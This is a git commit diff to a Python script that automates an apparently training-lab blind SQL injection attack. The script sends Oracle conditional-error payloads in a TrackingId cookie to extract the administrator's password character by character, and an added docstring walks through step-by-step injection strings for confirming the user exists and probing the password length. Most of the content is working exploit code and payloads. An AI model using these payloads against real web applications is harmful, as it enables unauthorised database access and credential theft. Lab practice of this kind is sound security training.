004440d0d3bfceb03d42f0e18397ac4d37d2c85f
ahmedabdulwhhab <80491399+ahmedabdulwhhab@users.noreply.github.com>
2024-10-18 17:45:37 +0300

    Update Lab Blind SQL injection with conditional errors.py

--- Lab Blind SQL injection with conditional errors.py
+++ Lab Blind SQL injection with conditional errors.py
@@ -29,9 +29,34 @@ while True:
         sys.stdout.write(f"\r[+] Password: {password}{char}")
         cookies = {
             "session": "6hkZoumrQhrU9o4i03CQxdXkDpyTiePP",
-            "TrackingId": f"h2dGFtb9XTYwq4zk' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{index},1) = '{char}",
-        }
+            "TrackingId": f"h2dGFtb9XTYwq4zk' ||(SELECT CASE WHEN LENGTH(password)<{index} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+            }
+        #TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
         resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
         if hint in resp.text:
             password = password + char
             index = index + 1
+
+
+
+"""
+You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+Verify that the condition is true (the error is received), confirming that there is a user called administrator.
+
+The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
+
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+This condition should be true, confirming that the password is greater than 1 character in length.
+
+Send a series of follow-up values to test different password lengths. Send:
+
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+Then send:
+
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+And so on. 
+
+"""
